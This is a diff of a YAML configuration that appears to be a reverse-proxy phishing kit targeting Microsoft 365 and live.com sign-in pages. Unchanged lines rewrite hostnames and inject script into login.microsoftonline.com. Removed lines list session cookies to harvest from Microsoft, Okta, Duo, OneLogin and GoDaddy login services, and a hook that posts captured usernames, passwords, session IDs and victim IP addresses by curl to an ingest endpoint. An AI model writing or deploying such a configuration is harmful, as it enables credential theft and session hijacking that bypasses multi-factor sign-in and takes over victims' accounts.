@@ -150,42 +150,6 @@ sub_filters:
   - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
 
-auth_tokens:
-  - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'brcap', 'x-ms-device-info', 'CCState', 'AADSSO', 'AADSSOTILES', 'ESTSSSOTILES', 'esctx', 'esctx-.*']
-  - domain: 'login.microsoftonline.com'
-    keys: ['ESTSSC', 'ESTSAUTHLIGHT', 'buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice', 'AADSSOTILES', 'ESTSSSOTILES', 'MicrosoftApplicationsTelemetryDeviceId', 'MSFPC', 'ai_session']
-  - domain: '.microsoftonline.com'
-    keys: ['wlidperf']
-  - domain: 'passwordreset.microsoftonline.com'
-    keys: ['ASP.NET_SessionId']
-  - domain: '.live.com'
-    keys: ['MSPOK', 'wlidperf', 'WLID1', 'OParams', 'amsc', '_RwBf']
-  - domain: '.login.live.com'
-    keys: ['MSPOK', 'wlidperf', 'WLID1', 'OParams', 'amsc', '_RwBf']
-  - domain: 'login.live.com'
-    keys: ['MSPOK', 'wlidperf', 'WLID1L', 'OParams', 'amsc', '_RwBf']
-  - domain: 'outlook.live.com'
-    keys: ['MSPOK', 'wlidperf', 'WLID1', 'OParams', 'amsc', '_RwBf']
-  - domain: 'sso.secureserver.net'
-    keys: ['akm_lmprb-ssn', 'akm_lmprb']
-  - domain: 'sso.godaddy.com'
-    keys: ['akm_lmprb-ssn', 'akm_lmprb']
-  - domain: 'onelogin.com'
-    keys: ['_onelogin_session', 'sub_session_onelogin', 'session_memory']
-  - domain: '.onelogin.com'
-    keys: ['_onelogin_session', 'sub_session_onelogin', 'session_memory']
-  - domain: 'duosecurity.com'
-    keys: ['duo_auth']
-  - domain: '.duosecurity.com'
-    keys: ['duo_auth']
-  - domain: 'login.duosecurity.com'
-    keys: ['duo_auth']
-  - domain: '.login.duosecurity.com'
-    keys: ['duo_auth']
-  - domain: '.okta.com'
-    keys: ['sid', 'okta-oauth-nonce', 'okta-oauth-state']
-
 force_post:
   - path: "/ppsecure/post*"
     search:
@@ -225,24 +189,6 @@ credentials:
 login:
   domain: "login.microsoftonline.com"
   path: "/"
-
-post_capture_hook:
-  - trigger_on: "/log/session"
-    exec: >
-      curl -X POST 'http://127.0.0.1:3000/v1/session/ingest'
-      -H 'Content-Type: application/json'
-      -d '{
-            "service_name": "Office 365",
-            "session_id": "{session_id}",
-            "form_data": {
-              "username": "{username}",
-              "password": "{password}"
-            },
-            "client_details": {
-              "user_agent": "{user_agent}",
-              "ip_address": "{remote_ip}"
-            }
-          }'
 
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
